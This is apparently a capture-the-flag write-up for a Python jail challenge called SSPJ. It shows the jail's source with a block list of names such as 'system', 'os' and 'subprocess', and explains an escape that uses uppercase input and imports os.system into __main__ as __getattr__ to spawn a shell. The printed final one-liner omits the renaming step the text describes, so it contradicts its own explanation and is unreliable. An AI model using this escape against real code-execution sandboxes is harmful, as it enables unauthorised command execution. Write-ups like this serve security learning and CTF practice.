---
title: Srdnlen CTF 2025 - SSPJ
date: '2025-01-19'
lastmod: '2025-01-20T22:03:00+02:00'
categories:
- writeup
- srdnlen25
tags:
- misc
- pyjail
authors:
- salvatore.abello
---

# SSPJ

## Challenge

```py
import random

class SSPJ(object):
    def __init__(self):
        print("Welcome to the Super Secure Python Jail (SSPJ)!")
        print("You can run your code here, but be careful not to break the rules...")

        self.code = self.code_sanitizer(input("Enter your data: "))

        # I'm so confident in my SSPJ that 
        # I don't even need to delete any globals/builtins
        exec(self.code, globals())
        return

    def code_sanitizer(self, code: str) -> str:
        if not code.isascii():
            print("Alien material detected... Exiting.")
            exit()

        banned_chars = [
            # Why do you need these characters?
            "m", "o", "w", "q", "b", "y", "u", "h", "c", "v", "z", "x", "k"
        ]

        banned_digits = [
            # Why do you need these digits?
            "0", "7", "1"
        ]

        banned_symbols = [
            # You don't need these...
            ".", "(", "'", "=", "{", ":", "@", '"', "[", "`"
        ]

        banned_words = [
            # Oh no, you can't use these words!
            "globals", "breakpoint", "locals", "self", "system", "open",
            "eval", "import", "exec", "flag", "os", "subprocess", "input",
            "random", "builtins", "code_sanitizer"
        ]

        blacklist = banned_chars + banned_digits + banned_symbols + banned_words
        random.shuffle(blacklist)

        if any(map(lambda c: c in code, blacklist)):
            print("Are you trying to cheat me!? Emergency exit in progress.")
            exit()

        return code.lower()

if __name__ == "__main__":
    SSPJ()
```

## Solve

This is a simple pyjail. We can't use `(`, `[`, `{` and also `.`, `=` so it's basically impossible to pollute attributes of `help`, `license`, etc.

Note that the builtins are not removed so we can import modules. Also, there's a character blacklist which is easily bypassable by sending the payload in uppercase.

The only thing that we can pollute is the `__main__` module. This is possible because when a module is imported, it can be accessed in the `__main__` one. So if you do something like:

```py
from os import system
```

then the `system` will be accessible from `__main__.system`. We can abuse this by renaming `system` to `__getattr__` so if we try to import something from the main module, it will call our function.

Final exploit:

```py
FROM OS IMPORT SYSTEM; FROM __MAIN__ IMPORT SH
```
